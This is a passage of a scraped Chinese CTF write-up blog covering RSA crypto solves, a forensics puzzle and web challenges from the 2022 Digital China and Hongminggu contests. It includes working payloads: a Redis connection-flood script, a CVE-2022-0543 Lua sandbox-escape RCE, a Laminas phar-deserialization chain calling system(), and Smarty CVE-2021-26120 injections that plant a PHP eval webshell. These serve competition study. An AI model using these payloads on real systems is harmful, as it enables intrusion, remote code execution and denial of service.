print(&quot;Done.&quot;) elif algo == &quot;BKZ&quot;: print(&quot;Performing BKZ reduction...&quot;); B = B.BKZ(block_size=len(instance)); print(&quot;Done.&quot;) dM = B[0,0]; d = dM // M; d = abs(d) #print(&quot; dM = &#123;&#125; \\n d = &#123;&#125;&quot;.format(dM, d)) if dM % d != 0: print(&quot;Fail to attack these instances.&quot;) return d instance=[&#123;&#x27;n&#x27;: 22910513874693731529794699437442585462797081074103281779720083438061943013290432867011373716709417770312374751929375184399034771058269694856532799959667041949121677104962602483584220375066079604310070170092110918929461013245513822473684968402351301685536123078521742332569393464306987452108453769431731102270963491458275901025886934456519659607039590731813386955268927981582044269612552247646692665197630976125168347209436275087984418329250553880615465123204025637362363070467484414411836736730245255823697709223006295849021945454748749818267833284501738496721945926714238227282740984681203937986318475852613929143251, &#x27;e&#x27;: mpz(418124818904584070636620437710361776090108506722591991514327934718784299737047502474085855254559869088800261398118869672209434420120317794653495668931393612406838516073527165572665005311548385479495512125271138526092300831851385800096274657668272325217430873751117716114419867692780958968593067192631486465423296524872397276474537511163042204868149575744589259544051450221302783320687258509440413868395816339688622906116768142782258988907394078830699053778292652215833104980849507933199494718914518742424146673598276155185664130838758323044619387740517935666414486691281183770077399065117822052210868255904129790857)&#125;, &#123;&#x27;n&#x27;: 24372481233234868877240458155800588580812953522873807226302786080581993950256157944642464867939762785144387544453522937931896100733484147952058102175740010137587724723034224506078443611576936256666765665550805512133208920980958204618194835347188290890392310460401576052448288739131559585387573534907086475030543828004657399151430511548607561670043211239782273890775589109913476784232834837759148258891293128608842072813994609343360665814202983846428806925879491443490368367467031496582975802337035122899501568440236021091854147442105515442233972362265981345047688567838639803532996157470683787433310033185814953656983, &#x27;e&#x27;: mpz(19143210339300240201214681568913908802203503378911354545783039851820649892001553640716724601777727911454833349588457910280062957963591589075572961361180751463216343846048742052319037925338897041933549452371741246029630187856751307559582731572601728128923668396302767081553351715263257018622487964555758751394847916982565081947216610481734739374914343623808948309951213792814166136267321554178708974135800594894999474676582468832744187994651063639342955574804522901017010028411977615943713171646182786270245242731511044090824221392904310116952767116375673790524507805832568864433094351529367145180574506758961891723713)&#125;, &#123;&#x27;n&#x27;: 24679015975199035427851554685850831633070053899857418484328145060044137550417808217226266986645286514288875260824299646109417892815567800404597047275827535258493172074535206108309907723199659370694192036854964007484633842788093367827915513408997725200824738313725110004104110062857308871076565274842616810840840810744799197704524580056030433553354133397041717795975389389238167191396628898787682599806871009262885431040360774734536368609797684355652388715712552700783779991265411167252723184924189561560018768009199749473695337780587873810629536482188724130484987746341109701417010165543419592212024193621264862157437, &#x27;e&#x27;: mpz(1887466323771244506126050040652897884230288720026513972534347995161387672855941521729593627560537130159609645850851312546802205326329236157151902749914059157236234397788369920413655818810511725066749956880552355520230065767054687221730528133402180824270938119599446091654881896367427441429406021700330179507358460436236173403829804136590987361179940109750138029351494643114058319058124904762608681397348022925627376074826811350518080031530194579924378909569680695196260687073292527268362345061093483687699693119108452554448873156890231817232965303834553227987138777939162459009424732328429033584600222583239341864361)&#125;, &#123;&#x27;n&#x27;: 20725846433298459818738516063389861157454145887412567309241971368192930248390172552460032176060600040992720084753747686885177277168920132042523397036270405823908393368295992028165872545209655962017977363348351903746731605928564721934116632473077039008788587133825619811922502829333793026171268937670512542626155796001634809633664680547300701846259322677726234892599145592757089259403977732051835633093448559478273833139316384288698135960343103244801500564407369891836897783914804945533546962961701061687990485508696254709609957808586842087409899693206392569585425380859078318139127000550432581295099509030669863867303, &#x27;e&#x27;: mpz(2363237573854087670976417969883225633360397442974401061049216894475393422244866973952932756882139865641894504435941506895224713566917990611214046823492289837152901617831851336386026240304485783973236642121278289706255550485010385013170275793369386007680778694579559138881420935348763388540214604799462174889474198144497241133628301258759734097809090228161716735359351895750148751120435424528229013305162159696839414242261305275449518850079365302566268954286580666577767306164857063096608849641777683700226797033332925301661913694775501692542844702513650655471083144015543032647455807221102876601998869281360384396969)&#125;, &#123;&#x27;n&#x27;: 22809935750576912865959231885839360732534906212225458022717669424614748661511918579549919916493236188484439882038298212760793306304545526844216353471055053556871150974522878690375438562426087440233386393370359683872593815943709353082095631111639041143754373874991575027747570017739942341766604387224176018793894754930878629709819661862381387213173036726945372240282580901124702248064018648150065273248946129523748193672656981316427317060071759239832204248176611648685460398874668097756975672168707026506110403992926074215511420161013025697858596735206101616761571190864709956992427309041192147394141071079459513490611, &#x27;e&#x27;: mpz(13133555776569547650925045548918236939639526554394889895596620269739174476566352794864343622356222299566279371551432530070481257368316784755930075662834731500502345517682356361164582999060502872211361694222132015741819795145796909591665107893860146356770485006797484186247196345168223924741037976946102849578524579606338846422314675808836631910676758185839828694899691695652500538122088029311150940192651185968892410331308490420642197863628213020528562440239348622456640781055180466849084742096007240725499537008098270708800128906741434883430906389880429863171839180158004739621168711466811317518568593570244234356473)&#125;, &#123;&#x27;n&#x27;: 22480694282480941856240478144806308314675949068465587320650365753607181629359667506510327246960059600070975543193248132715947284941641953388046978099792445163848997480222534711956558077424201889790307253643733334819206791789849391745265354084064007637913171566532460998684708503229350236485373560557693046199065144657259010989119048370619489811662974589653263692671635131186093439219165642237949026744612661967562816404233890288374130410997771410589750213626670311839445013864803976998563166191406408874373459540505835186973304663516643096962903654014842811813401296109284028861941906109336060451132312463266201415329, &#x27;e&#x27;: mpz(5624874560950753498859866139527579818312781394539479470831958979447428570824824324740771269291165645086210973103272336121731912398585096517141753168417402556661950218674390872421989641336537837013066620791238206533730906030501700325503296214297695138747177011202671679049512237059817685651828933521719416294029149562504049154660843723718018891705220638761705284473974644590524030504330156413475638165884760254514165992618015237764971157843554639068828315161344021009639686458808898375286838635679965954906305612625538770521388361497066840616893440392969988298775795541575848039950165133743457112710681254111761236977)&#125;, &#123;&#x27;n&#x27;: 24864800348158528479906787630817628786057394652940528220487672878224821093187748399176495638492155238253951061624119446159699883923429845058879913539518385471765492064482097277790223293260128881959273708226181373995800760490076615976367890263392717551259059978955019671550523682528756210608945906533001192976007098872901938952015131822528777969231670678207075524375456230663716322781932990075477736910925180207286309477685449506037405249527178078075985163439166820012435973787796791138399698319190416826416307419995704905995638505495443894477749261164124960538410932525360254583333096355932627999150017132814090333241, &#x27;e&#x27;: mpz(3856630503719827855844626836485236690181435414315645355130063964022152923723080539565019021355419177735019322219325830072037487528940021907267513161749071974608699933871793463562863522229082468683243901644845826059349596659323042299690790765030373981718166011819585074704820443905345396257414353837002151781007668563125603659889904298805297904725270532210911911226283011734773982797544816536205681843451163076486100161244600813341737446527784779893709854495658416561649974958835452357349125453415490361795100092166500410617267171431892907868601018198501626162578176872991772913847456399112257982770466218683435977233)&#125;, &#123;&#x27;n&#x27;: 19124038956715221534475664748050443644784017946285501767743851038866178811578425211712395772512764081657114249264750411100125353521253413105314358045769042565775171832528505858934347564408448715726606220509887643736405686485259106596314428705429329567823354848621662213427380804714681617624381700294984971221298888824492282135460743333840937811577196086176023601621687706265164503993591934717195202747810262431964418069040376377368805912956880604436193067845497931435910276011392268756936356824924016508042574993560735189920618883256138946496688867855672114401245107938884098540558998467042804767676383399885670917863, &#x27;e&#x27;: mpz(2526864429486600013372544534422176076310449606548856304461485276066637941365632554754458596530587265120176820669070912170194561174897463295107537549901995199720429699901644961145517761531066171228894272527951311393341049801262112401226497042253995829727117709996063274895247764121887846333559590006675066290762310586706087473986643091625437211817626727787839725750573398738378173014091184388786245327948372467755559879615874741522637847583054177607416293895012819765959700604109526983132083773582729514355334522134224212163590455593583898122500139694022270117330389492890927144273267138493069027225729811456941196841)&#125;, &#123;&#x27;n&#x27;: 22712694846618225919656596038340253703950387189307356916884965227715575385290510648357788918083042127579214343856073731099014236390909368166091091105572503659963582091256239405080287823086072151464554676361316498173485846962725704572373404896028400947773894219506964827695493355671062126899085653349150889714833678676595701733978080393121447152690832437658688817450477965220947545046095740313522911930620442467826353136237204001953779248526332341778622938019495861382365118525764027553983694265494431463871584823902011764736743452157607708114643621663013938789045186398065113397082412393217306851766751359748485479947, &#x27;e&#x27;: mpz(10677712174622673625461359647500782439433165156123940439219715020101430663583415600108354143755028037935813256146383342375176716193336557365518193617245378776772825370333872189153024262271406627376370626366265587010646777359582552203727155755566858670727867097618066172109680249978907948880949039026897280024621775610018299977269676137246768591695700091958272943505065479321506848835565663826406807954755395641654795735858484165741728341231569210806669852646070268250158341835400267707050630955072247788775265007770528881479089247519947243736784181303650218623544794991471865627967303089855830890716351172499822666657)&#125;, &#123;&#x27;n&#x27;: 29530501528048179618993188667259709438380823126457692419992781599742162976314963077892631687601059594978412657041475380032477805818407564226390560549020301725312531169814413208353912738658672008557076821628601123546429396788497410673839196924586021049176714044555896053623390330789641538577117351494577537192456906989432523245836053774828613790929239698312653550748067411624343544340442517761647170791413344362742142440328926448233820806068777032405586400091222100390759969032135228099677059219202752058583088660274632343174038249349622867356306772975206078721974271500052236762769794504351873161093377781217621800851, &#x27;e&#x27;: mpz(8729173604239025011857782023927738952041674447805777183092178780381283882428344889128776928009726731687565885792801585411233568278521882651010769203046279626441420751041892471066965129701726335998417117456164919970929625892898165284166374265463104192123359891593075186135067029442765544980841269006919805416544688157191347297531124766371177370618922502642426517831690685654226275590626523865698087716363119573077628586230380384786269088962223486145179686564375420888574395904747308189390860655468787526259462696913684329894120410714757458285565733273719525515391646880556812753596710689221817572185451401270933654073)&#125;] c=mpz(8249481061276641012500781695740094434470113414066017209484215230041921646049458178370330794241115341376535075017119365874406375409425518256323024908492829783852428861824372134924435528670473416419205178211753257025999328702024596957043540125702709160006013219820565345682050977792920885144964033305130028650810667051301594273570335413667926122212987004423933365573720187183851963886897210680516485876928056049295497627661890470786325640353389624242623725312661098422286151242366448450478297382717820442653339243537262050892660153070690559134669225520213623348774988576340953811305002965060069852345476309887418617950) d=common_private_attack(instance)for i in range(0,11): n=instance[i][&#x27;n&#x27;] m1=pow(c,d,n) m=long_to_bytes(m1) if b&#x27;NSSCTF&#x27; in m: print(m) break else: i+1 rrssaa2和闽盾杯那题爆零密码一样的考法，e与phi不互质，并且需要amm开根运算，源码： 12345678910111213141516171819202122from Crypto.Util.number import *import randomimport libnumimport gmpy2def gen(): p = 1801 * random.getrandbits(1012) + 1 while not isPrime(p): p = 1801 * random.getrandbits(1012) + 1 return pp=gen()q=gen()e=1801n=p*qflag=&#x27;NSSCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;flag=flag+&#x27;yhe92871899hihiohh97709ujojl;lhdiwoqu903YE98Y299HDY8W9EYRW8!$$%!$!$FSR@#$@%FSEGDRYERYHRWER@$%^$^DGTW%$^&amp;GRWR@$%@FASFSFQFSTGW#TWGARWQ$@%WGVDSGADQR@%TGVDSFASDATWEGHWE%@$GSDVSFQATY$^#^%@$!RAFSDGDRTW&#x27;c = pow(m, e, n)print(&#x27;e=&#x27;,e)print(&#x27;p=&#x27;,p)print(&#x27;q=&#x27;,q)print(&#x27;c=&#x27;,c) 但是这里有个坑爹的地方，闽盾那个脚本中的k和这次的k有区别，不能直接套，因此要改下exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115import randomimport timedef cal_k(s, r): R.&lt;x&gt; = PolynomialRing(GF(r)) f = x * s + 1 k = int(f.roots()[0][0]) print(k) return k# About 3 seconds to rundef AMM(o, r, q): start = time.time() print(&#x27;\\n----------------------------------------------------------------------------------&#x27;) print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;) print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t)) k = cal_k(s, r) alp = (k * s + 1) // r print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&#x27;[+] Calculating DLP...&#x27;) j = - dicreat_log(a, d) print(&#x27;[+] Finish DLP...&#x27;) b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result)) return resultdef findAllPRoot(p, e): print(&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;.format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p): print(&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;.format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return all_mpe= 1801p= 49610229352589717245227429186510630298995334563536199979797365135356894947505595171590737127611751124743823204969291853243936699113293137172961540731655194113111189561603261168928406442577570919901769348742992633428864861175880441682752947688509869668929473479230018031647980097396415380123118521799468844841q= 21081926656979729045764441706195868361643779935106260715219328461497406780587336009385210898093496090213306812904410650499587043699660339207567766840318127296396962037273317168795761421233687815992929975284592353117739413561939283754964442896468496199833988666060155459156116345763999855126020972915904618043c= 601596145172542477058917394071994325109856881057412872218601643742101914635753765731910337249806643258952637146341530783703613931109366648847232809553067941206928974141651198815184695746636818122414926015513095322872645068410957200062317958684872682628646759817233433643987003499153702624673493727886566639667597997520471371146056861227114668317633291934130573158877960548655006208725827943739971068608175370661619328559766977175575896437656636083179668805135271793023165492681941002853661303072959879197775224449456951125268328000206540965011249895216257583247180682482954741912101069920760903900864428405997751199cp = c % pcq = c % qmp = AMM(cp, e, p)mq = AMM(cq, e, q)p_proot = findAllPRoot(p, e)q_proot = findAllPRoot(q, e)mps = findAllSolutions(mp, p_proot, cp, p)mqs = findAllSolutions(mq, q_proot, cq, q)print(mps, mqs)def check(m): h = m.hex() if len(h) &amp; 1: return False if bytes.fromhex(h).startswith(b&#x27;NSSCTF&#x27;): print(bytes.fromhex(h)) return True else: return False# About 16 mins to run 0x1337^2 == 24196561 times CRTstart = time.time()result = []print(&#x27;Start CRT...&#x27;)for mpp in mps: for mqq in mqs: solution = CRT_list([int(mpp), int(mqq)], [p, q]) if check(solution): print(solution) result.append(bytes.fromhex(solution.hex())) print(time.time() - start)end = time.time()print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start))print(&quot;result:&quot;, result) Misc套娃这次misc感觉就这道取证值得说道说道，其他的题不是太简单就是自己犯蠢没想出来，这题还是有一定难度的。 filescan搜索，发现可疑zip文件，提取出来后里面有一个pwd.txt和一个image.rar两个文件，压缩包是加密的，密码应该就是pwd里面的内容了。 pwd.txt： 1KVKFMU2NNN4HKTJSGVGWGVSWOVKVORSKKZUUCZY= 这里做了个套娃，一个base32，一个base64，而最后一个是换表base64，用CyberChef可以解除最后的密码： 1pwD_1s_h3re! 解压后发现是一堆图片，附件里还有个array.txt，同样也套了几层编码，unicode+base64+base32+hex，解出来一个数组： 132, 24, 6, 28, 15, 31,7, 23, 13, 27, 30, 33,12, 8, 5, 26, 29, 16,34, 22, 2, 14, 9, 17,21, 1, 19, 10, 4, 36,35, 25, 11, 20, 3, 18 发现刚好和图片数量吻合，应该就是拼图顺序了，可以写脚本，但是我菜不会写就手拼了，反正不多，这里贴个wp里的exp： 12345678910111213141516171819202122from PIL import Imagename_list = [[32, 24, 6, 28, 15, 31], [7, 23, 13, 27, 30, 33], [12, 8, 5, 26, 29, 16], [34, 22, 2, 14, 9, 17], [21, 1, 19, 10, 4, 36], [35, 25, 11, 20, 3, 18]]img = Image.open(&quot;./image/1.png&quot;)width, height = img.sizecrop_width = width * 6crop_height = height * 6image = Image.new(&#x27;RGB&#x27;, (crop_width, crop_height))# 利用循环将所有图片拼接到创建的新图片上for i in range(0,6): for j in range(0,6): name = str(name_list[i][j]) + &quot;.png&quot; s_image = Image.open(&quot;./image/&quot; + name) box2 = (width * j, height * i, width * (j + 1), height * (i + 1)) image.paste(s_image, box2) 拼完后能得到一个字符串： 158s4vb6rt4pt5r32yd6ht5u656555r6796524vi69r2yd5om6w0 最后利用twin-hex解码字符串得到flag。","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"【数字中国创新大赛】赛后复现","slug":"【数字中国创新大赛】赛后复现","date":"2022-03-22T10:16:04.000Z","updated":"2022-03-24T06:22:44.274Z","comments":true,"path":"2022/03/22/【数字中国创新大赛】赛后复现/","link":"","permalink":"http://example.com/2022/03/22/%E3%80%90%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/","excerpt":"前言 为什么说是赛后复现，因为大部分都没做出来，tcl（。","text":"前言 为什么说是赛后复现，因为大部分都没做出来，tcl（。 虎符赛道Plain Text给了一串base64，解码后得到： 1dOBRO POVALOWATX NA MAT^, WY DOLVNY PEREWESTI \\TO NA ANGLIJSKIJ QZYK. tWOJ SEKRET SOSTOIT IZ DWUH SLOW. wSE BUKWY STRO^NYE. qBLO^NYJ ARBUZ. vELAEM WAM OTLI^NOGO DNQ. 啥玩意看得我一愣一愣的，各种尝试也没试出来，然后我队友放翻译软件里面试了试，发现有猫腻，发现是俄文，对应转化： 123а-a、б-b、в-v、г-g、д-d、е-je、ё-jo、ж-zh、з-z、и-e、й-jj、к-k、л-l、м-m、н-n、о-o、п-p、р-r、с-s、т-t。у-u、ф-f、х-kh、ц-c、ч-ch、ш-sh、щ-sch、ъ-&quot; ы-y ь-&#x27;、э-eh、ю-ju、я-ja 因此原文转化为： 123дОБРО ПОВАЛОШАТХ НА МАТ^,ШЫ ДОЛВНЫ ПЕРЕШЕСТИ эТО НА АНГЛИЙСКИЙЯЗЫК. тШОЙ СЕКРЕТ СОСТОИТ ИЗ ДBa СЛОBa. шСЕ БУКШЫ СТРО^НЫЕ.яБЛО^НЫЙ АРБУЗ. вЕЛАЕМ ШАМ ОТЛИ^НОГО ДНЯ. 最后翻译得到flag： 123WELCOME TO MATH, YOU SHOULD TRANSFER THIS INTO ENGLISHLANGUAGE. YOUR SECRET IS A TWO WORD. SHSE BUKSHY STROKE.APPLE ^ WATERMELON. WE WILL HAVE A GOOD DAY. Quest-Crash打崩redis就可以了，redis连接数超过10000后就会无法连接，一直发包就可以了。 用bp或写exp都可： 1234567891011121314151617181920212223import requestsimport jsonurl = &quot;http://120.76.219.239:25502/sendreq&quot;s = requests.session()headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;for i in range(0,1000000): data0 = &#123; &quot;query&quot;: f&quot;SET \\&quot;&#123;i&#125;\\&quot; \\&quot;&#123;str(i)*10000&#125;\\&quot;&quot;, &#125; data1 = &#123; &quot;query&quot;: f&quot;GET \\&quot;&#123;i&#125;\\&quot;&quot;, &#125; data2 = &#123; &quot;query&quot;: &quot;GETFLAG&quot;, &#125; r0 = s.post(url=url, data=json.dumps(data0), headers=headers) r1 = s.post(url=url, data=json.dumps(data1), headers=headers) r2 = s.post(url=url, data=json.dumps(data2), headers=headers) print(r2.text) Quest-RCE万万没想到misc要用cve打，实在难崩，而且我前一天还刚刚看过p牛写的关于这个cve的文章，结果做的时候就忘了。（ cve-2022-0543，Redis Lua 沙盒逃逸 RCE。原理文章：CVE-2022-0543 exp： 1234567891011121314import requestssession = requests.Session()rawBody = &quot;&#123;\\&quot;query\\&quot;:\\&quot;INFO\\\\neval &#x27;local io_l =package.loadlib(\\\\\\&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\\\\&quot;,\\\\\\&quot;luaopen_io\\\\\\&quot;); local io = io_l(); local f = io.popen(\\\\\\&quot;cat /f*\\\\\\&quot;,\\\\\\&quot;r\\\\\\&quot;); local res = f:read(\\\\\\&quot;*a\\\\\\&quot;); f:close(); return res&#x27; 0\\&quot;&#125;&quot;headers = &#123;&quot;Origin&quot;:&quot;http://120.25.155.106:21570&quot;,&quot;Accept&quot;:&quot;*/*&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/99.0.4844.74Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://120.25.155.106:21570/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125;response = session.post(&quot;http://120.25.155.106:25502/sendreq&quot;, data=rawBody,headers=headers)print(&quot;Status code: %i&quot; % response.status_code)print(&quot;Response body: %s&quot; % response.content) otherbabysql和ezphp这两题暂时没时间或者环境原因还没有复现，等之后有条件了再复现。 红明谷赛道MissingFile再也不相信取证了，直接string就能搜出来…… 或者010进去搜索字符串也可以 Fan websitewww.zip源码泄露，下载下来审计，发现是laminas组件，并且找到下面这段代码： 12345678910111213public function imgdeleteAction()&#123; $request = $this-&gt;getRequest(); if(isset($request-&gt;getPost()[&#x27;imgpath&#x27;]))&#123; $imgpath = $request-&gt;getPost()[&#x27;imgpath&#x27;]; $base = substr($imgpath,-4,4); if(in_array($base,$this-&gt;white_list))&#123; //白名单 @unlink($imgpath); &#125;else&#123; echo &#x27;Only Img File Can Be Deleted!&#x27;; &#125; &#125;&#125; 这个地方通过删除文件可以触发phar反序列化，到时候专门写篇博客具体学习phar反序列化。 接着发现有过滤： 123456789if(in_array($base,$this-&gt;white_list))&#123; //白名单限制 $cont = file_get_contents($data[&quot;image-file&quot;][&quot;tmp_name&quot;]); if (preg_match(&quot;/&lt;\\?|php|HALT\\_COMPILER/i&quot;, $cont )) &#123; die(&quot;Not This&quot;); &#125; if($data[&quot;image-file&quot;][&quot;size&quot;]&lt;3000)&#123; die(&quot;The picture size must be more than 3kb&quot;); &#125; $img_path = realpath(getcwd()).&#x27;/public/img/&#x27;.md5($data[&quot;image-file&quot;][&quot;name&quot;]).$base; 使用gzip压缩绕过前面的过滤，大小过滤使用$phar-&gt;addFromString写入进行绕过。接着通过现有的链子进行改编，得到exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//https://xz.aliyun.com/t/8975&lt;?phpnamespace Laminas\\View\\Resolver&#123; class TemplateMapResolver&#123; protected $map = [&quot;setBody&quot;=&gt;&quot;system&quot;]; &#125;&#125;namespace Laminas\\View\\Renderer&#123; class PhpRenderer&#123; private $__helpers; function __construct()&#123; $this-&gt;__helpers = new \\Laminas\\View\\Resolver\\TemplateMapResolver(); &#125; &#125;&#125;namespace Laminas\\Log\\Writer&#123; abstract class AbstractWriter&#123;&#125; class Mail extends AbstractWriter&#123; protected $eventsToMail = [&quot;cat /flag&quot;]; // cmd cmd cmd protected $subjectPrependText = null; protected $mail; function __construct()&#123; $this-&gt;mail = new \\Laminas\\View\\Renderer\\PhpRenderer(); &#125; &#125;&#125;namespace Laminas\\Log&#123; class Logger&#123; protected $writers; function __construct()&#123; $this-&gt;writers = [new \\Laminas\\Log\\Writer\\Mail()]; &#125; &#125;&#125;namespace&#123; $a = new \\Laminas\\Log\\Logger(); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = $a; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, str_repeat(&quot;mrl64&quot;,999999));//添加文件，签名自动计算 $phar-&gt;stopBuffering();&#125;?&gt; 获取phar文件，如果报错的话可以去php.ini中更改配置： 123[Phar]; http://php.net/phar.readonlyphar.readonly = Off 然后进行一波gzip打包，将文件后缀改为png后上传，最后在删除图片的路由下删除图片获取flag，payload： 1phar://./public/img/xxxxxxx.png Smarty_calculator仍然是www.zip源码泄露，首先是index.php中对cookie判断，因此发包时要在cookie上添加login=1。 方法一非预期解，接着审Smarty的代码，首先data传进后被display方法处理，因为包含了Smarty.class.php，因此从这个文件跟进。当时做题的时候没看出来问题在哪，后来去群里看了看发现这里存在一个cve：php 沙箱逃逸,PHP Smarty模版代码注入漏洞（CVE-2021-26120Smarty Template Engine Multiple Sandbox Escape PHP Code Injection Vulnerabilities 然后群里的大佬说math那个地方存在eval函数，github上也存在相关测试数据。 测试后发现function.math.php中存在报错。这个cve在这题中可以直接利用，不过要绕waf。 先构造payload写入webshell，然后绕过即可，例如八进制、URL编码配合换行绕过等等： 1data=eval:&#123;$x=&quot;42&quot;&#125;&#123;math equation=&quot;(&quot;file_put_contents&quot;)(&quot;123.php&quot;,&quot;&lt;?php eval($_REQUEST[&#x27;aaa&#x27;]);?&gt;&quot;)&quot;&#125; 蚁剑连接后利用插件绕过disable_functions，在根目录获取flag。 或者直接构造变量替换： 12?1=phpinfo();data=eval:&#123;$x = &quot;4&quot;&#125;&#123;$y = &quot;5.5&quot;&#125;&#123;math equation=&quot;`calc` x * y&quot; x=$x y=$y&#125; 方法二官方wp中的方法，通过对比官方源码的区别找到正则，并且官方的CHANGELOG.md中提到了安全问题： 1&#123;function name=&#x27;blah&#x27;&#125;&#123;/function&#125; 通过换行绕过正则读取phpinfo，发现open_basedir以及disable_functions，这里就可以写webshell或者通过ini_set配合 chdir的trick来绕过open_basedir读取flag： 12?1=phpinfo();data=%7Bfunction%20name%3D&#x27;exp()%7B%7D%3Beval(%24_GET%5B1%5D)%3Bfunction%0A%0A&#x27;%7D%7B%2Ffunction%7D easy_yatask.py: 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *import osfrom flag import flagdef gen(): e = 3 while True: try: p = getPrime(512) q = getPrime(512) n = p*q phi = (p-1)*(q-1) d = inverse(e,phi) return p,q,d,n,e except: continue returnp,q,d,n,e = gen()r = getPrime(512)m = bytes_to_long(flag+os.urandom(32))M = m%rc = pow(m,e,n)print(&quot;r = %d&quot;%r)print(&quot;M = %d&quot;%M)print(&quot;n = %d&quot;%n)print(&quot;e = %d&quot;%e)print(&quot;c = %d&quot;%c)&#x27;&#x27;&#x27;r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287e = 3c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282&#x27;&#x27;&#x27; 这题的本质是e低指数，但是不能用之前用的常规脚本，因为估计这个e不是整数，需要使用到coppersmith的求根方法对系数进行爆破，exp： 123456789101112131415161718//sagefrom Crypto.Util.number import *r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287e = 3c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282kbits = 100m0 = MPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = ((M + x*r)^e) - cf = f.monic()x0 = f.small_roots(X=2^kbits,beta=1)[0]print(x0)m = M + x0*rprint(long_to_bytes(m)) 运行得出flag。","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf -web","slug":"ctf-web","permalink":"http://example.com/tags/ctf-web/"}]},{"title":"攻防世界2","slug":"攻防世界2","date":"2022-03-18T11:51:31.000Z","updated":"2022-03-18T13:35:55.445Z","comments":true,"path":"2022/03/18/攻防世界2/","link":"","permalink":"http://example.com/2022/03/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C2/","excerpt":"前言 明天打虎符了，好久没打攻防世界的题了，回来练练手，顺便记录下一些有意思的没做过的题。","text":"前言 明天打虎符了，好久没打攻防世界的题了，回来练练手，顺便记录下一些有意思的没做过的题。 favorite_number查看代码： 1234567891011121314151617 &lt;?php//php5.5.9$stuff = $_POST[&quot;stuff&quot;];$array = [&#x27;admin&#x27;, &#x27;user&#x27;];if($stuff === $array &amp;&amp; $stuff[0] != &#x27;admin&#x27;) &#123; $num= $_POST[&quot;num&quot;]; if (preg_match(&quot;/^\\d+$/im&quot;,$num))&#123; if 